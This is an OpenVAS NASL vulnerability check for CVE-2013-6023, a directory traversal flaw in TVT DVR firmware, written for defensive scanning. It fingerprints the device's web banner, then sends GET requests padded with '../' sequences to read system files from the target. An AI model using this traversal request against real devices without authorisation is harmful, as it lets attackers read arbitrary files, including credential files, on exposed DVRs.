##############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_tvt_dvr_dir_trav_vuln.nasl 11401 2018-09-15 08:45:50Z cfischer $
#
# TVT DVR Directory Traversal Vulnerability
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (C) 2013 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.803784");
  script_version("$Revision: 11401 $");
  script_cve_id("CVE-2013-6023");
  script_bugtraq_id(63360);
  script_tag(name:"cvss_base", value:"7.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:N/A:N");
  script_tag(name:"last_modification", value:"$Date: 2018-09-15 10:45:50 +0200 (Sat, 15 Sep 2018) $");
  script_tag(name:"creation_date", value:"2013-12-05 16:15:57 +0530 (Thu, 05 Dec 2013)");
  script_name("TVT DVR Directory Traversal Vulnerability");

  script_tag(name:"summary", value:"The host is running TVT DVR and is prone to directory traversal
  vulnerability.");
  script_tag(name:"vuldetect", value:"Send the crafted HTTP GET request and check the is it possible to read
  the system file.");
  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer release, disable respective features, remove the product or replace the product by another one.");
  script_tag(name:"insight", value:"The flaw is due to an improper sanitation of encoded user input via HTTP
  requests using directory traversal attack (e.g., ../).");
  script_tag(name:"affected", value:"TVT TD-2308SS-B DVR with firmware 3.2.0.P-3520A-00 and earlier");
  script_tag(name:"impact", value:"Successful exploitation will allow attackers to read arbitrary files
  on the target system.");

  script_tag(name:"solution_type", value:"WillNotFix");

  script_xref(name:"URL", value:"http://www.kb.cert.org/vuls/id/785838");
  script_xref(name:"URL", value:"http://jvn.jp/cert/JVNVU97210126/index.html");
  script_xref(name:"URL", value:"http://packetstormsecurity.com/files/124231");
  script_xref(name:"URL", value:"http://alguienenlafisi.blogspot.in/2013/10/dvr-tvt-directory-traversal.html");

  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_copyright("Copyright (C) 2013 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_get_http_banner.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("Cross_Web_Server/banner");

  exit(0);
}

include("misc_func.inc");
include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");

dvrPort = get_http_port(default:80);

tvrBanner = get_http_banner(port:dvrPort);
if("Server: Cross Web Server" >!< tvrBanner){
  exit(0);
}

files = traversal_files();
foreach file (keys(files))
{
  url = "/" + crap(data:"../",length:15) + files[file];

  if(http_vuln_check(port:dvrPort, url:url, pattern:file))
  {
    security_message(port:dvrPort);
    exit(0);
  }
}

exit(99);
